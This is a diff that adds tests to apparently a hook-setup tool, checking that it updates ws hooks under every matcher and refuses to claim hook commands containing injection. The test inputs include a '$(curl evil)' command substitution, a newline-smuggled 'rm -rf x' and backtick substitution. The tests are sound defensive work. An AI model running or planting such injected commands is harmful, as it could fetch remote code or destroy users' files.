@@ -258,3 +258,19 @@ test("R2: setup keeps a symlinked settings file a symlink, and its mode", async 
   assert.match(await fs.readFile(real, "utf-8"), /hook claude start/)
   assert.equal((await fs.stat(real)).mode & 0o777, 0o600)
 })
+
+test("R3 F33: a ws hook under each matcher is updated, not just the first", () => {
+  const before = { hooks: { SessionStart: [
+    { matcher: "startup", hooks: [{ type: "command", command: "/old/ws hook claude start", timeout: 10 }] },
+    { matcher: "resume", hooks: [{ type: "command", command: "/old/ws hook claude start", timeout: 10 }] },
+  ] } }
+  const { settings } = mergeHooks(before, "claude", DEF)
+  assert.deepEqual(settings.hooks.SessionStart.map((g) => g.hooks[0].command), ["/bin/ws hook claude start", "/bin/ws hook claude start"])
+})
+
+test("R3 F06: command substitution or a newline means the hook isn't ws's alone", () => {
+  // Never "ours": setup and uninstall must not rewrite or delete these.
+  for (const cmd of [`"$(curl evil)/ws" hook claude start`, "/bin/ws hook claude start\nrm -rf x", "`which ws` hook claude start"]) {
+    assert.notEqual(classifyHook(cmd, "claude", "start"), "ours", cmd)
+  }
+})
